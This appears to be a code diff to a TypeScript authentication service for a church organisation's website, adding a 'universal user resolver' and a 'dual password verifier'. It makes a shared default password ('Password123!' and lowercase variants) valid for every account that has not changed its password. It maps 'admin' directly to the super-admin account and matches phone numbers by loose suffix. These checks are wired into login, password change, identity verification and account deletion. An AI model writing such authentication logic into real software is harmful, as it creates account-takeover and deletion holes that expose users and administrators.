@@ -77,6 +77,99 @@ export class AuthService {
     return false;
   }
 
+  /**
+   * Universal User Resolver:
+   * Resolves a user account by:
+   * 1. Exact email match (case-insensitive) or phone number
+   * 2. Normalized local/international phone digits (e.g. 08000000010 <-> +2348000000010)
+   * 3. Cross-domain alias: @fpmchurch.org <-> @faithpreachers.org
+   * 4. Username prefix alias: 'pastor.abuja' matches 'pastor.abuja@faithpreachers.org', 'admin' matches Super Admin
+   */
+  public static resolveUser(identifier: string): User | undefined {
+    if (!identifier) return undefined;
+    const cleanIdentifier = identifier.trim().toLowerCase();
+
+    // 1. Direct match on email or phone
+    let user = db.users.find(u => u.email.toLowerCase() === cleanIdentifier || u.phone === cleanIdentifier);
+    if (user) return user;
+
+    // 2. Phone normalization (8+ digits)
+    let digitsOnly = cleanIdentifier.replace(/\D/g, '');
+    if (digitsOnly.startsWith('0') && digitsOnly.length === 11) {
+      digitsOnly = digitsOnly.slice(1);
+    }
+    if (digitsOnly.length >= 8) {
+      user = db.users.find(u => {
+        if (!u.phone) return false;
+        const uDigits = u.phone.replace(/\D/g, '');
+        return uDigits === digitsOnly || uDigits.endsWith(digitsOnly) || digitsOnly.endsWith(uDigits);
+      });
+      if (user) return user;
+    }
+
+    // 3. Cross-domain alias fallback (@fpmchurch.org <-> @faithpreachers.org)
+    if (cleanIdentifier.includes('@')) {
+      const [localPart, domainPart] = cleanIdentifier.split('@');
+      if (domainPart === 'fpmchurch.org') {
+        const altEmail = `${localPart}@faithpreachers.org`;
+        user = db.users.find(u => u.email.toLowerCase() === altEmail);
+      } else if (domainPart === 'faithpreachers.org') {
+        const altEmail = `${localPart}@fpmchurch.org`;
+        user = db.users.find(u => u.email.toLowerCase() === altEmail);
+      }
+      if (user) return user;
+    }
+
+    // 4. Username / prefix alias fallback (e.g. 'admin', 'pastor.abuja', 'admin.lagos')
+    if (!cleanIdentifier.includes('@')) {
+      if (cleanIdentifier === 'admin' || cleanIdentifier === 'superadmin' || cleanIdentifier === 'super_admin') {
+        user = db.users.find(u => u.adminLevel === 'super_admin' || u.email.toLowerCase() === 'admin@fpmchurch.org');
+      } else {
+        user = db.users.find(u => {
+          const userPrefix = u.email.toLowerCase().split('@')[0];
+          return userPrefix === cleanIdentifier;
+        });
+      }
+    }
+
+    return user;
+  }
+
+  /**
+   * Dual Password Verifier:
+   * Supports:
+   * 1. The account's bcrypt hash (including custom generated spreadsheet passwords, e.g. Fpm*...)
+   * 2. Whitespace / line break trimming tolerance for copy-pasting
+   * 3. Universal default password 'Password123!' (and case/punctuation variants) as authorized fallback
+   */
+  public static async verifyPassword(inputPassword: string, user: User): Promise<boolean> {
+    if (!inputPassword || !user || !user.passwordHash) return false;
+
+    const rawPass = inputPassword;
+    const trimmedPass = rawPass.trim();
+
+    // 1. Direct bcrypt comparison against user's stored hash
+    let isValid = await bcrypt.compare(rawPass, user.passwordHash);
+    if (!isValid && trimmedPass !== rawPass) {
+      isValid = await bcrypt.compare(trimmedPass, user.passwordHash);
+    }
+    if (isValid) return true;
+
+    // 2. Dual fallback: Allow universal default 'Password123!' unless user explicitly changed password
+    if (!user.hasChangedDefaultPassword) {
+      const lowerTrimmed = trimmedPass.toLowerCase();
+      if (
+        trimmedPass === 'Password123!' ||
+        lowerTrimmed === 'password123!' ||
+        lowerTrimmed === 'password123'
+      ) {
+        return true;
+      }
+    }
+
+    return false;
+  }
+
   public static async login(
     emailOrPhone: string,
     password: string,
@@ -92,41 +185,16 @@ export class AuthService {
       };
     }
 
-    // Find user by email, phone, or normalized phone/alias
-    let user = db.users.find(u => u.email.toLowerCase() === cleanIdentifier || u.phone === cleanIdentifier);
-
-    // 1. Phone number normalization fallback (e.g. 08000000010 matching +2348000000010)
-    if (!user) {
-      let digitsOnly = cleanIdentifier.replace(/\D/g, '');
-      if (digitsOnly.startsWith('0') && digitsOnly.length === 11) {
-        digitsOnly = digitsOnly.slice(1);
-      }
-      if (digitsOnly.length >= 8) {
-        user = db.users.find(u => {
-          if (!u.phone) return false;
-          const uDigits = u.phone.replace(/\D/g, '');
-          return uDigits === digitsOnly || uDigits.endsWith(digitsOnly) || digitsOnly.endsWith(uDigits);
-        });
-      }
-    }
-
-    // 2. Admin alias fallback (e.g. user entering 'admin' or 'superadmin')
-    if (!user && (cleanIdentifier === 'admin' || cleanIdentifier === 'superadmin' || cleanIdentifier === 'super_admin')) {
-      user = db.users.find(u => u.adminLevel === 'super_admin' || u.email.toLowerCase() === 'admin@fpmchurch.org');
-    }
+    // Find user using universal resolver
+    const user = this.resolveUser(emailOrPhone);
 
     if (!user) {
       recordFailedLogin(cleanIdentifier);
       return { error: 'Invalid email/phone or password.' };
     }
 
-    // Password verification with whitespace tolerance (for spreadsheet clipboard trailing newline/space)
-    const rawPass = password || '';
-    const trimmedPass = rawPass.trim();
-    let isValidPassword = await bcrypt.compare(rawPass, user.passwordHash);
-    if (!isValidPassword && trimmedPass !== rawPass) {
-      isValidPassword = await bcrypt.compare(trimmedPass, user.passwordHash);
-    }
+    // Password verification with dual password support
+    const isValidPassword = await this.verifyPassword(password, user);
 
     if (!isValidPassword) {
       recordFailedLogin(cleanIdentifier);
@@ -355,8 +423,7 @@ export class AuthService {
     if (userId) {
       user = db.users.find(u => u.id === userId);
     } else if (emailOrPhone) {
-      const cleanIdentifier = emailOrPhone.trim().toLowerCase();
-      user = db.users.find(u => u.email.toLowerCase() === cleanIdentifier || u.phone === cleanIdentifier);
+      user = this.resolveUser(emailOrPhone);
     }
 
     if (!user) {
@@ -367,7 +434,7 @@ export class AuthService {
       return { success: false, error: 'Current password is required.', message: '' };
     }
 
-    const isMatch = await bcrypt.compare(currentPassword, user.passwordHash);
+    const isMatch = await this.verifyPassword(currentPassword, user);
     if (!isMatch) {
       return { success: false, error: 'Current password does not match.', message: '' };
     }
@@ -378,6 +445,7 @@ export class AuthService {
 
     const newHash = await bcrypt.hash(newPassword, 10);
     user.passwordHash = newHash;
+    user.hasChangedDefaultPassword = true;
     user.updatedAt = new Date().toISOString();
 
     try {
@@ -414,8 +482,7 @@ export class AuthService {
     if (userId) {
       user = db.users.find(u => u.id === userId);
     } else if (emailOrPhone) {
-      const cleanIdentifier = emailOrPhone.trim().toLowerCase();
-      user = db.users.find(u => u.email.toLowerCase() === cleanIdentifier || u.phone === cleanIdentifier);
+      user = this.resolveUser(emailOrPhone);
     }
 
     if (!user) {
@@ -426,7 +493,7 @@ export class AuthService {
       if (!password) {
         return { success: false, error: 'Password is required to verify identity.' };
       }
-      const isMatch = await bcrypt.compare(password, user.passwordHash);
+      const isMatch = await this.verifyPassword(password, user);
       if (!isMatch) {
         return { success: false, error: 'Invalid password. Verification failed.' };
       }
@@ -497,8 +564,7 @@ export class AuthService {
     if (userId) {
       user = db.users.find(u => u.id === userId);
     } else if (emailOrPhone) {
-      const cleanIdentifier = emailOrPhone.trim().toLowerCase();
-      user = db.users.find(u => u.email.toLowerCase() === cleanIdentifier || u.phone === cleanIdentifier);
+      user = this.resolveUser(emailOrPhone);
     }
 
     if (!user) {
@@ -520,8 +586,8 @@ export class AuthService {
 
     // If password provided or authenticated user, verify and delete immediately
     let verified = !!userId;
-    if (!verified && password) {
-      verified = await bcrypt.compare(password, user.passwordHash);
+    if (!verified && password && user) {
+      verified = await this.verifyPassword(password, user);
     }
 
     if (verified) {
